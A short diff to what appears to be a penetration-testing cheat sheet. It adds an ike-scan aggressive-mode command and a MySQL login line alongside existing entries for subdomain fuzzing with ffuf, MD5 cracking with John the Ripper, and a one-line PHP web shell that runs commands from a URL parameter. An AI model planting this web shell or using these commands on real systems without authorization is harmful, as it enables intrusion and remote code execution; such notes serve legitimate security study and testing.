@@ -13,7 +13,11 @@ sub domain scan: ```ffuf -u 'http://example.com/' -H 'Host: FUZZ.example.com -w 
 
 hash: ```john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5```
 
+ike: ```ike-scan -M -A <target_ip>```
+
 git: ```git clone https://github.com/example/example.git```
+
+sql: ```mysql -h localhost -P 3306 -u user -p```
 
 Web Shell: ```<?php echo "<div>".system($_GET['cmd'])."</div>"; ?>```
 
